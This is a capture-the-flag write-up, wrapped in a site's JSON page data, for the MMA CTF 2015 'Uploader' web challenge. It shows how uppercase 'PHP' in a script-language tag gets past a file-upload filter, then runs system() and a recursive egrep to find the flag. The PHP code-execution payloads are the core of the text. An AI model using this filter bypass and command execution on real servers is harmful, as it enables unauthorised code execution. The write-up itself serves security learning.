{"pageContext":{"html":"<p><a href=\"ctf=mma-ctf-2015\"></a>\n<a href=\"type=web\"></a>\n<a href=\"tags=php,lfi,rce\"></a>\n<a href=\"tools=\"></a>\n<a href=\"techniques=\"></a></p>\n<h1>Uploader (web-100)</h1>\n<p>Website says 'You can upload any file!', and really lets us. But when uploading text files, it removes any '&#x3C;?' or 'php' as mentioned in the problem. Obviously, this question is based on LFI+Remote Code Execution, we need to get our php running there somehow. First I tried uploading various variations of php hello world, like:</p>\n<p>`<code></code>php</p>\n<?php echo 'Hello world!';\n```\n```php\n<? echo 'Hello world!';\n```\n```shell\n#!/usr/bin/php -r\necho 'Hello world!';\n```\nNothing seemed to work. Since '<?'s are being removed, I tried:\n```php\n<<?? echo 'Hello world!';\n```\nStill, no use.\n\nIs it possible to run without <? tags?\n\nAfter googling, we see from php manual page that, we can use these tags instead:\n```php\n<script language=\"php\"> echo('Hello world!'); </script>\n```\nBut after uploading, the word 'php' is removed, resulting in\n```php\n<script language=\"\"> echo('Hello world!'); </script>\n```\nI was out of ideas. But after a long time, I realized that question only talks about removing 'php', but does it remove 'PHP' (uppercase) ? Let's find out:\n```php\n<script language=\"PHP\"> echo('Hello world!'); </script>\n```\nSuccess! We got our php\n running, now we just have to look for the flag.\n\nFirst, let me check a few variables\n```php\n<script language=\"PHP\">\necho $flag;\nprint_r(get_defined_vars());\nprint_r(get_defined_constants());\n</script>\n```\nNope, nothing here. Let's look at some files:\n```php\n<script language=\"PHP\">\nsystem(\"ls\");\n</script>\n```\nNothing useful here, let's do a full system search:\n```php\n<script language=\"PHP\"> echo system(\"egrep -rnis 'MMA{' /\"); </script>\n```\nAaand we get our flag:\n\n> MMA{you can run php from script tag}\n","relativePath":"writeups/mma-ctf-2015/web/uploader/chaitan94"}}